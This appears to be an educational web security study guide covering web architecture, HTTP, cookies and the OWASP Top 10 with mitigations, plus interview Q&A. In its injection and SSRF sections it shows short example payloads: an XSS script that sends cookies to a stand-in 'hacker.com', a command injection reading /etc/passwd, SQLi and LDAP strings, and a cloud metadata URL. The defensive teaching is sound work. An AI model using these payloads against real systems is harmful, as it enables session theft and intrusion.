## 🏗️ Structure of Web Applications

A web application is a software program that runs on a web server and is accessed over the internet through a web browser. The architecture generally consists of three main tiers:

### 1. Frontend (Presentation Layer)
**What is it?** This is what the user sees and interacts with directly in the browser (the UI/UX). It runs entirely on the client's machine.
**Key Technologies:**
- **HTML:** Defines the structure (buttons, text, images).
- **CSS:** Defines the style (colors, layout, fonts).
- **JavaScript (JS):** Defines the logic and interactivity (animations, fetching data).
- **Frameworks:** React, Angular, Vue.

### 2. Backend (Logic / Application Layer)
**What is it?** The "brain" of the application. It runs on a remote server, processes user requests, performs calculations, enforces business rules, and communicates with the database.
**Key Technologies:**
- **Languages:** Python, Java, Node.js (JavaScript), PHP, Ruby, C#.
- **Frameworks:** Django, Spring Boot, Express.js.

### 3. Database (Data Layer)
**What is it?** Where all the application's persistent data (users, passwords, posts, settings) is stored and retrieved.
**Key Technologies:**
- **Relational (SQL):** MySQL, PostgreSQL, Oracle (uses tables/rows).
- **Non-Relational (NoSQL):** MongoDB, Redis, Cassandra (uses documents/key-value).

## 🔌 API (Application Programming Interface)

**What is it?** An API is a set of rules that allows two different software applications to talk to each other.
**Analogy:** The Waiter in a restaurant.
- You (the Frontend) look at the menu and give your order to the waiter (the API).
- The waiter takes the order to the kitchen (the Backend/Database).
- The kitchen makes the food, and the waiter brings it back to you.

**Why is it important in Security?** APIs are often the primary attack surface for modern web applications. If an API doesn't properly check authorization (who is making the request), attackers can steal data.

## 🌐 Protocols & HTTP Requests

**HTTP (Hypertext Transfer Protocol):** The foundation of data communication on the World Wide Web. It is a stateless, text-based protocol.

### Common HTTP Request Methods (Verbs)

| Method | What it does | Real-world example |
|--------|-------------|--------------------|
| **GET** | Retrieves data from the server. | Loading a webpage or viewing a profile. |
| **POST** | Sends data to the server to create something new. | Submitting a login form, creating a new post. |
| **PUT** | Replaces/updates existing data completely. | Updating your entire user profile. |
| **PATCH** | Partially updates existing data. | Changing just your password. |
| **DELETE** | Removes data from the server. | Deleting a comment or account. |
| **OPTIONS**| Asks the server what HTTP methods are allowed. | Pre-flight CORS checks by browsers. |

## 🖥️ Thin Client vs. Thick Client Web Apps

| Feature | Thin Client | Thick Client (Fat Client) |
|---------|-------------|---------------------------|
| **Where does logic run?** | Mostly on the **Server** (Backend). | Mostly on the **Client** (Browser/Frontend). |
| **Processing Power Needed**| Very low (browser just displays what server sends). | High (browser downloads JS and computes it locally). |
| **Examples** | Traditional websites (Wikipedia), old PHP sites. | Modern Single Page Apps (React/Angular), Google Docs, Figma. |
| **Security Risk** | Server-side attacks (SQLi, Command Injection). | Client-side attacks (XSS, DOM manipulation, exposed logic in JS). |

## 🧭 Browser Components

When a browser loads a web app, it uses several internal engines:
1. **User Interface:** The address bar, back/forward buttons, bookmarks (everything except the actual webpage window).
2. **Browser Engine:** Manages communication between the UI and the rendering engine.
3. **Rendering Engine:** Parses HTML/CSS and displays the requested content on the screen (e.g., Blink for Chrome, WebKit for Safari).
4. **Networking:** Handles network calls like HTTP requests.
5. **JavaScript Engine:** Parses and executes JavaScript code (e.g., V8 for Chrome, SpiderMonkey for Firefox).
6. **Data Storage:** The browser's local storage mechanisms (Cookies, LocalStorage, IndexedDB).

## 🍪 Cookies & Caches

### Cookies
- **What are they?** Small pieces of text data stored in the user's browser by the server.
- **Primary Use:** **Session Management**. HTTP is "stateless" (it forgets who you are after every request). A cookie acts like a VIP wristband. You log in once, the server gives you a cookie, and your browser sends that cookie with every future request so the server knows it's still you.
- **Security Attributes:**
  - `Secure`: Cookie is only sent over HTTPS.
  - `HttpOnly`: Prevents JavaScript (and XSS attacks) from reading the cookie.
  - `SameSite`: Protects against Cross-Site Request Forgery (CSRF).

### Caches
- **What is it?** A temporary storage mechanism that saves copies of files (images, CSS, JS) locally on your hard drive.
- **Primary Use:** **Performance**. If you visit a site tomorrow, your browser loads the logo from your local cache instead of downloading it again from the server, making the site load faster.

## 🚦 HTTP Status Code Classes

When a server responds to an HTTP request, it sends a 3-digit status code. The first digit defines the class of response.

| Class | Meaning | Examples |
|-------|---------|----------|
| **1xx** | **Informational:** Request received, continuing process. | `100 Continue`, `101 Switching Protocols` (WebSockets) |
| **2xx** | **Success:** The action was successfully received and accepted. | `200 OK` (standard success), `201 Created` |
| **3xx** | **Redirection:** Further action must be taken to complete the request. | `301 Moved Permanently`, `302 Found` (temporary redirect) |
| **4xx** | **Client Error:** You (the client) messed up. Bad request, unauthorized, etc. | `400 Bad Request`, `401 Unauthorized` (needs login), `403 Forbidden` (no access), `404 Not Found` |
| **5xx** | **Server Error:** The server messed up. It crashed or failed to fulfill a valid request. | `500 Internal Server Error` (backend crash), `502 Bad Gateway`, `503 Service Unavailable` |

## 🔑 Authentication vs. Authorization

Before discussing attacks, you must understand these two concepts (they are often confused):
- **Authentication (AuthN):** Verifying *who you are*. (e.g., Logging in with a username and password).
- **Authorization (AuthZ):** Verifying *what you are allowed to do*. (e.g., A regular user trying to access the admin dashboard).

### 💡 Common Mistake
Never confuse the two in an interview. **Authentication = Identity. Authorization = Permissions.**

## 🔀 Encoding vs. Encryption vs. Hashing

| Concept | Purpose | Can it be reversed? | Common Algorithms |
|---------|---------|---------------------|-------------------|
| **Encoding** | Changes data format for safe transmission (not for security). | ✅ Yes (easily) | Base64, URL Encoding |
| **Encryption**| Hides data from unauthorized users using a secret key. | ✅ Yes (with the key) | AES, RSA, ChaCha20 |
| **Hashing** | Creates a unique, fixed-length fingerprint of data (one-way). | ❌ No | SHA-256, bcrypt, Argon2 |

### 🧠 Remember
- Use **Encoding** to send data (like an image) over text-based HTTP.
- Use **Encryption** to protect credit card numbers.
- Use **Hashing** to securely store passwords.

## 🪲 Vulnerabilities vs. Attacks

Before diving into OWASP, it is critical to understand the difference between a vulnerability and an attack:
- **Vulnerability:** A weakness or flaw in the system (e.g., failing to sanitize user input, misconfigured permissions, outdated software). 
- **Attack (Exploit):** The action taken by a hacker to take advantage of that vulnerability (e.g., injecting SQL commands, bypassing a login screen).

> 💡 *A vulnerability is an unlocked door. An attack is a thief walking through it.*

## 🛡️ OWASP Deep Dive

**What is OWASP?**
The **Open Worldwide Application Security Project (OWASP)** is a global nonprofit organization focused on improving software security. It produces articles, methodologies, documentation, tools, and technologies that are free and open to anyone.

**Why is it important?**
OWASP is the gold standard for web application security. If you are a pentester, developer, or security analyst, your work revolves around OWASP guidelines. Compliance frameworks (like PCI-DSS) explicitly mandate that organizations protect against the OWASP Top 10.

**The OWASP Top 10**
Every few years, OWASP releases the "Top 10" — a consensus-driven report on the most critical security risks to web applications globally. 

> *Note: While the Top 10 lists 10 broad categories, each category contains hundreds of specific vulnerabilities.*

## 🚪 A01: Broken Access Control & IDOR

**Broken Access Control** is currently ranked as the **#1 most critical web application security risk** by OWASP (A01:2021).

### What is Access Control?
Access control (or Authorization) ensures that users can only do what they are explicitly permitted to do. It restricts access to resources based on identity and roles.

### What is Broken Access Control?
It occurs when the application fails to properly enforce those restrictions. As a result, attackers can access other users' accounts, view sensitive files, modify data, or elevate their privileges to an administrator level.

### Types of Privilege Escalation
1. **Vertical Privilege Escalation:** A regular user finds a way to perform actions meant for an Admin (e.g., accessing `/admin_dashboard` without being an admin).
2. **Horizontal Privilege Escalation:** A regular user accesses data belonging to *another* regular user (e.g., User A views User B's private messages).

---

### 🔍 IDOR (Insecure Direct Object Reference)

**What is it?** 
IDOR is a specific type of Broken Access Control. It happens when an application provides direct access to objects (database records, files, user accounts) based on user-supplied input (like a URL parameter), *without properly checking if the user is authorized to access that specific object*.

**How it works (Example):**
Imagine you log into your bank and view your receipt. The URL looks like this:
`https://bank.com/receipt?id=1005`

If the application is vulnerable to IDOR, a hacker could simply change the number in the URL:
`https://bank.com/receipt?id=1006`

If the server returns User 1006's receipt without checking if the person requesting it actually *owns* receipt 1006, that is an **IDOR vulnerability**.

**Common IDOR Targets:**
- User IDs (`?user_id=123`)
- Document IDs (`/download/file/44`)
- Account Numbers, Order Numbers, or API endpoints.

**How to Prevent IDOR & Broken Access Control:**
1. **Never trust user input:** Don't rely on hidden fields, URL parameters, or cookies to determine authorization.
2. **Check authorization on every request:** The backend must explicitly verify that the currently logged-in user owns the resource they are requesting.
3. **Use UUIDs/GUIDs:** Instead of predictable sequential IDs (like `id=1005`), use long, unpredictable random strings (like `id=9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d`). 

### 💡 Common Mistake
UUIDs make object enumeration harder, but **they do NOT prevent IDOR**. If an attacker manages to find someone else's UUID and the server doesn't check authorization, the IDOR still exists. Proper server-side authorization is the *only* prevention.

## 🔐 A02: Cryptographic Failures

**What is it?**
A cryptographic failure occurs when an application fails to properly protect sensitive data (like passwords, credit card numbers, health records, or personal info) in transit or at rest.

**Common Scenarios:**
- **In Transit:** Transmitting sensitive data in plaintext over HTTP, FTP, or using old, deprecated protocols (like SSL v3 or TLS 1.0).
- **At Rest:** Storing passwords in plaintext (or using weak, easily crackable hashes like MD5 or SHA1 without salting) in the database.
- **Key Management:** Hardcoding secret cryptographic keys inside the source code (e.g., in a public GitHub repo).

**Mitigation & Defense Strategies:**
1. **Encrypt Data in Transit:** Always use strong, modern encryption like TLS 1.2 or TLS 1.3 (HTTPS) for all data moving between the user and the server.
2. **Encrypt Data at Rest:** Sensitive data in the database should be encrypted. 
3. **Proper Password Hashing:** NEVER store passwords in plaintext or use fast hash functions like MD5. Use slow, mathematically complex, salted hashing algorithms designed for passwords (e.g., **Argon2**, **bcrypt**, or **scrypt**).
4. **Secrets Management:** Never hardcode keys in the source code. Use dedicated secret vaults (like AWS Secrets Manager, HashiCorp Vault, or Azure Key Vault).
5. **Disable Old Protocols:** Configure your servers to reject connections using deprecated protocols (like SSL or old TLS versions).

## 💉 A03: Injection

**What is it?**
Injection flaws occur when untrusted user data is sent to an interpreter (like a database, an OS shell, or a browser) as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or accessing data without proper authorization.

### 🔥 Common Types of Injection:

| Type of Injection | Target Interpreter | What it does | Example |
|-------------------|--------------------|--------------|---------|
| **SQL Injection (SQLi)** | The Database (SQL) | Tricks the database into running malicious queries. Can be used to bypass logins, dump the entire database, or delete tables. | Entering `' OR '1'='1` in a password field to log in as the first user (usually Admin) without a password. |
| **Command Injection (OS)** | The Operating System | Tricks the underlying server OS into running system commands (like `bash` or `cmd`). Extremely critical as it leads to full system takeover (RCE). | A ping tool that takes an IP address, but the attacker inputs `127.0.0.1 && cat /etc/passwd`. |
| **Cross-Site Scripting (XSS)** | The Victim's Browser | An attacker injects malicious JavaScript into a website. When a victim views the page, *their* browser executes the script. Used to steal session cookies or redirect users. | Posting `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>` in a public comment section. |
| **LDAP Injection** | Active Directory / LDAP | Targets directory services used for authentication on corporate networks to bypass logins or extract user structures. | Using `*)(uid=*))(|(uid=*` to trick the LDAP query. |

### 🛑 Deep Dive: SQL Injection (SQLi)

**How it works (The Attack Example):**
Imagine a poorly written login page where the backend PHP code takes the username and password from the frontend and drops it directly into a SQL query like this:

```sql
SELECT * FROM users WHERE username = '$user_input' AND password = '$password_input';
```

If the user enters a normal username like `Mukesh` and password `1234`, the query executes normally. But, an attacker enters this as their username:
`admin' OR '1'='1`

The backend inserts that directly into the query, making the final SQL look like this:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '';
```
**Why this is devastating:** The database reads `OR '1'='1'`, which is a mathematically true statement. Because it's true, the database ignores the password requirement and immediately logs the attacker in as the `admin` user!

**How to Prevent SQLi (The Ultimate Defense):**
The only bulletproof way to stop SQL injection is by using **Prepared Statements (also called Parameterized Queries)**. 
- *How it works:* Instead of pasting the user's input directly into the SQL command, the developer sends the SQL command to the database *first*, with empty placeholders (e.g., `WHERE username = ?`). 
- The user's input is sent *afterward* as a strictly typed variable. 
- The database is pre-compiled to treat the input purely as **data (a string)**, completely neutralizing any malicious code like `OR '1'='1'`. It will literally look for a user named `"admin' OR '1'='1"`.

### 🧠 Remember
Sanitization is good, but **Prepared Statements / Parameterized Queries** are the only true defense against SQL Injection.

## 🏗️ A04: Insecure Design

**What is it?**
Insecure Design focuses on risks related to architectural flaws. Unlike an implementation flaw (like forgetting to validate an input or leaving a default password), insecure design means the application is inherently insecure *by definition*, even if it was coded perfectly.

**Analogy:**
- An *implementation* flaw is building a strong vault but forgetting to lock the door.
- An *insecure design* flaw is building a vault out of cardboard. No matter how many locks you put on it, it's still fundamentally broken.

**Common Scenarios of Insecure Design:**
- **No Rate Limiting on Critical Paths:** A bank allows users to try an infinite number of passwords without locking the account (allowing Brute Force).
- **Security Questions as Sole Recovery Mechanism:** Asking "What is your mother's maiden name?" for password recovery. This design is insecure because the answer is easily discoverable via OSINT (social media).
- **Storing Sensitive Data Unnecessarily:** A movie theater app requires and stores Social Security Numbers just to buy tickets. This is a massive, unnecessary risk.

**Mitigation (Shift-Left Security):**
1. **Threat Modeling:** Sit down *before* writing any code and map out how an attacker might abuse the feature you are about to build. 
2. **Secure Design Patterns:** Use established, proven architectures instead of trying to invent your own custom security mechanisms.
3. **Least Privilege by Design:** Only collect, process, and store the absolute minimum amount of sensitive data required for the app to function.

## ⚙️ A05: Security Misconfiguration

**What is it?**
Security Misconfiguration happens when security settings are poorly defined, implemented, or left at their default values. It is one of the most common vulnerabilities because it doesn't require a coding flaw — it's just human error in setup.

**Common Examples:**
- Leaving default passwords on servers or admin panels (e.g., `admin` / `admin`).
- Exposing cloud storage buckets (like AWS S3) to the public.
- Enabling unnecessary features, ports, or services on a web server.
- Returning detailed stack traces/error messages to the user (which reveals backend tech to hackers).

### Mitigation & System Hardening
**System Hardening** is the process of securing a system by reducing its surface of vulnerability.
1. **Remove Unused Features:** Disable unnecessary ports, services, default accounts, and privileges. (Less features = smaller attack surface).
2. **Change Default Credentials:** Immediately change all default passwords upon installation of any software/hardware.
3. **Automate Hardening:** Use tools (like Ansible or Terraform) to deploy secure environments consistently so human error is minimized.
4. **Disable Directory Listing:** Ensure servers don't list out files if an `index.html` is missing.
5. **Generic Error Messages:** Configure the server to show generic error pages (e.g., "Something went wrong") instead of printing raw code/stack traces to the user.

## 📦 A06: Vulnerable and Outdated Components

**What is it?**
If you build a secure application but use an old version of a third-party framework, library, or server module that has known, published vulnerabilities (CVEs), your application is vulnerable by extension.

**Common Scenarios:**
- Running an old version of jQuery with known XSS vulnerabilities.
- Using a web server (like Apache or Nginx) that hasn't been patched in 3 years.

**Mitigation:**
1. **Patch Management:** Regularly update all OS, framework, and library components.
2. **Software Bill of Materials (SBOM):** Maintain a strict inventory of all third-party components your software uses.
3. **Dependency Scanning:** Use automated tools (like Snyk or OWASP Dependency-Check) to scan your libraries for known CVEs.

## 🔑 A07: Identification and Authentication Failures

**What is it?**
Authentication failures occur when an application incorrectly verifies a user's identity, allowing attackers to compromise passwords, keys, or session tokens and assume the identities of legitimate users.

### 🔥 Common Attacks:
1. **Brute Force & Dictionary Attacks:** Using automated scripts to guess passwords by trying millions of combinations or common words.
2. **Credential Stuffing:** Attackers take massive lists of leaked username/password pairs from *other* data breaches and test them against your site, knowing that users frequently reuse passwords.
3. **Session Hijacking:** Stealing a user's active session cookie (often via XSS or sniffing unencrypted HTTP traffic) to bypass the login screen entirely.

**Mitigation (How to stop it):**
1. **Multi-Factor Authentication (MFA):** The #1 defense. Even if an attacker steals the password, they cannot log in without the physical second factor.
2. **Implement Rate Limiting & Account Lockouts:** Stop brute-force and credential stuffing by locking an account after a few failed attempts.
3. **Check Passwords Against Breaches:** Reject new passwords that are known to be in existing data breach databases (e.g., HaveIBeenPwned API).

## 🧩 A08: Software and Data Integrity Failures

**What is it?**
This failure occurs when code or infrastructure does not protect against integrity violations. It happens when you trust data, software updates, or CI/CD pipelines without verifying that they haven't been tampered with.

**Common Scenarios:**
1. **Software Supply Chain Attacks:** An attacker compromises a third-party library (like in the SolarWinds hack). When your company downloads the update, the malicious code is imported into your secure environment.
2. **Insecure CI/CD Pipelines:** If a hacker compromises the Jenkins or GitHub Actions pipeline, they can deploy malicious code because the deployment process lacks integrity checks.
3. **Insecure Deserialization:** The application receives serialized data (like a JSON or XML object) from a user and deserializes it (converts it back into an active code object in memory) without verifying its integrity. Hackers manipulate this to execute remote code (RCE).
4. **Unsigned Firmware Updates:** A smart TV or router downloads an update over the internet without checking a digital signature.

**Mitigation:**
1. **Digital Signatures & Checksums:** Ensure all software updates and plugins are cryptographically signed. Use checksums (hashes) to verify that downloaded files haven't been altered in transit.
2. **Review CI/CD Security:** Enforce strict access control, segregation of duties, and configuration reviews for your build pipelines.

## 🚨 A09: Security Logging and Monitoring Failures

**What is it?**
This failure happens when an application is breached, but nobody knows about it because the system isn't keeping proper records (logs) or sending notifications (alerts). Without logs, incident response teams are blind.

**Common Scenarios:**
- Not logging high-value transactions or failed logins.
- **Logs Stored Locally:** A hacker compromises a server and simply deletes the local log file to cover their tracks.
- **No Active Alerting:** The system logs a brute-force attack, but nobody looks at the logs until a month later.

**Mitigation:**
1. **Log All Security Events:** Ensure logins, logouts, failed access attempts, and administrative actions are logged.
2. **Centralized Logging:** Send all logs to a secure, remote centralized server (like a SIEM tool: Splunk, ELK stack) in real-time. If a hacker destroys the web server, the logs are safe elsewhere.
3. **Set Up Active Alerts:** Configure the SIEM to automatically trigger high-priority alerts (via email/PagerDuty/Slack) when suspicious patterns are detected.

## 🌐 A10: Server-Side Request Forgery (SSRF)

**What is it?**
SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).

**How it works:**
If a web application has a feature to download an image from a user-provided URL (`https://example.com/image.jpg`), an attacker can supply an internal URL instead (like `http://localhost/admin` or `http://169.254.169.254/latest/meta-data/` on AWS). The web server will make the request *on behalf of the attacker*, bypassing external firewalls and returning sensitive internal data.

**Mitigation:**
1. **Validate and Sanitize Input:** Enforce a strict allowlist of domains/IPs the application is allowed to fetch data from.
2. **Disable URL Redirections:** Ensure the HTTP client does not blindly follow redirects to internal networks.
3. **Network Segmentation:** Isolate backend systems so that even if the web server makes a request, it cannot reach sensitive internal infrastructure.

## ⚠️ Secure Coding: Mishandling of Exceptional Conditions

*(Note: This is a critical Secure Coding concept (CWE-754), distinct from the OWASP Top 10).*

**What is it?**
This occurs when an application encounters an unexpected error (an exception) but fails to handle it safely. Instead of recovering gracefully or shutting down securely, the application might crash, expose sensitive backend data, or "fail open" (granting access when it shouldn't).

**Common Scenarios:**
- **Information Disclosure (Stack Traces):** A user inputs letters into a field expecting numbers. The database crashes, and the web app prints the raw SQL query and database connection string directly to the user's screen.
- **Failing Open:** A firewall or authentication module encounters a memory error while checking a user's password. Because the code didn't know what to do, it bypasses the check and logs the user in anyway.

**Mitigation:**
1. **Generic Error Messages:** Never display raw stack traces. Always display a generic "Something went wrong" message.
2. **Fail Securely (Fail Closed):** Design the application so that if an error occurs during a security check, the default action is to *deny* access.
3. **Try-Catch Blocks:** Ensure all input processing is wrapped in proper exception handling so the application catches errors and continues running without crashing.

## 🌟 Web Application Security Best Practices

To summarize the defenses against the OWASP Top 10 and secure modern web applications, developers and security engineers should follow these universal best practices:

1. **Shift Left:** Integrate security early in the Software Development Life Cycle (SDLC) through threat modeling and secure design, rather than treating security as an afterthought.
2. **Defense in Depth:** Layer your security. Don't rely on a single firewall; use network firewalls, Web Application Firewalls (WAF), endpoint protection, and strong backend authorization checks.
3. **Principle of Least Privilege (PoLP):** Give users, services, and CI/CD pipelines only the exact minimum permissions they need to do their job, and nothing more.
4. **Never Trust User Input:** Always validate, sanitize, and encode user input. Use Parameterized Queries to block SQL Injection.
5. **Enforce HTTPS Everywhere:** Use strong encryption (TLS 1.2+) for data in transit and strong, salted hashes (bcrypt/Argon2) for passwords at rest.
6. **Implement MFA:** Require Multi-Factor Authentication for all administrative and highly sensitive accounts to mitigate credential stuffing and brute force attacks.
7. **Keep Everything Updated:** Use Dependency Scanners and SBOMs to track third-party libraries and patch vulnerabilities immediately to prevent Software Supply Chain attacks.

## 🎯 Interview Q&A

**Q: Explain the difference between Frontend, Backend, and Database.**
> The **Frontend** is the presentation layer (HTML/CSS/JS) that runs in the user's browser. The **Backend** is the application logic running on the server that processes requests. The **Database** is the storage layer where persistent data is kept.

**Q: What is the difference between a GET and POST request?**
> A **GET** request is used to retrieve data from the server and shouldn't change the server's state (parameters are visible in the URL). A **POST** request is used to send data to the server to create or update a resource (data is hidden in the request body).

**Q: What is the difference between a 401 and 403 status code?**
> **401 Unauthorized** means you are not authenticated (you need to log in). **403 Forbidden** means you *are* authenticated, but you do not have the authorization/permissions to view that specific resource.

**Q: What is the difference between a thin client and a thick client web app?**
> In a **thin client**, the server does almost all the processing and just sends HTML to the browser to display. In a **thick client** (like a React app), the server mostly just sends raw data via APIs, and the browser does heavy lifting locally via JavaScript to render the UI and manage state.

**Q: What is the purpose of the `HttpOnly` flag on a cookie?**
> It prevents client-side scripts (JavaScript) from accessing the cookie. This is a critical defense against Cross-Site Scripting (XSS) attacks trying to steal session cookies.

**Q: Explain the difference between a cookie and a cache.**
> A **cookie** stores small bits of state data (like session IDs) to identify the user to the server across requests. A **cache** stores static files (images, scripts) locally to speed up page load times on subsequent visits.

**Q: What is OWASP and why is the Top 10 important?**
> OWASP is a global nonprofit focused on software security. Their Top 10 report is the industry-standard awareness document outlining the most critical security risks to web applications, guiding developers and pentesters on what to secure first.

**Q: What is Broken Access Control?**
> It's when an application fails to properly enforce restrictions on what authenticated users are allowed to do. This allows attackers to access unauthorized data, modify other users' accounts, or elevate their privileges (e.g., gaining admin rights).

**Q: What is IDOR? Can you give an example?**
> IDOR (Insecure Direct Object Reference) is an access control vulnerability where an application uses client-supplied input to access objects directly without checking authorization. For example, if a user views their profile at `site.com/profile?id=10`, and they change it to `id=11` to view someone else's private profile, that is an IDOR.

**Q: What is System Hardening?**
> System hardening is the process of reducing an application or server's attack surface. It involves mitigating security misconfigurations by changing default passwords, disabling unnecessary services, and configuring generic error messages.

**Q: Describe a Software Supply Chain Attack.**
> It's an attack where hackers compromise a third-party vendor, library, or dependency rather than attacking a company directly. When the company updates their software using the compromised dependency, the hackers gain access (e.g., the SolarWinds attack).

**Q: How does Checksum Validation protect the supply chain?**
> A checksum is a cryptographic hash of a file. By comparing the hash of a downloaded update against the vendor's published hash, a company can mathematically verify that the file was not altered by hackers during transit.

**Q: Why is CI/CD security critical?**
> The CI/CD pipeline automates deploying code to production. If an attacker compromises the CI/CD server, they can inject malicious code directly into live applications without ever needing to touch the developers' source code repositories.

**Q: Name two ways to mitigate Cryptographic Failures for passwords.**
> 1) Never store passwords in plaintext; always hash them using strong, salted, slow algorithms like bcrypt or Argon2 (never MD5). 2) Always enforce HTTPS (TLS 1.2 or 1.3) so the password is encrypted in transit between the user and the server.

**Q: What is an Injection attack, and what is the best defense against SQLi?**
> An injection attack happens when untrusted user input is mistakenly executed as code by a backend interpreter (like a database or OS). The absolute best defense against SQL Injection is using **Prepared Statements (Parameterized Queries)**, which force the database to treat input strictly as data, not executable commands.

**Q: What is the difference between SQLi and XSS?**
> **SQLi (SQL Injection)** attacks the *backend database* to steal or manipulate data. **XSS (Cross-Site Scripting)** attacks the *frontend* (the victim's browser) by injecting malicious JavaScript to steal their session cookies or perform actions on their behalf.

**Q: What is the difference between an implementation flaw and an insecure design flaw?**
> An implementation flaw is a mistake made while coding (like forgetting to lock a vault door). An insecure design flaw means the architecture itself is fundamentally flawed regardless of how well it is coded (like building the vault out of cardboard).

**Q: Explain Credential Stuffing and how to prevent it.**
> Credential stuffing is an automated attack where hackers use large lists of usernames and passwords leaked from *other* website breaches to try and log into *your* website, exploiting the fact that people reuse passwords. The best prevention is enforcing **Multi-Factor Authentication (MFA)** and rate-limiting login attempts.

**Q: What is Insecure Deserialization?**
> It is a type of Data Integrity Failure where an application takes serialized data (like a JSON object) from a user and converts it back into an active object in memory without verifying it first. Attackers manipulate this data to alter application logic or achieve Remote Code Execution (RCE).

**Q: Why is centralized logging important for incident response?**
> If logs are only stored locally on a web server, a hacker who compromises the server can simply delete the logs to cover their tracks. Centralized logging (sending logs to a secure, remote SIEM) ensures the evidence is preserved even if the original server is destroyed.

**Q: What does it mean for an application to "Fail Closed" vs "Fail Open"?**
> When an exception or error occurs during a security check, "Failing Closed" means the application defaults to denying access (secure). "Failing Open" means the application crashes and accidentally grants access or bypasses the security check (insecure). Secure coding requires apps to always Fail Closed.

**Q: What is Burp Suite and what is its primary function?**
> Burp Suite is a web application security testing tool developed by PortSwigger. Its primary function is to act as an intercepting proxy, allowing penetration testers to capture, inspect, and modify HTTP/HTTPS traffic between a browser and a web server to find vulnerabilities like Injection or IDOR.
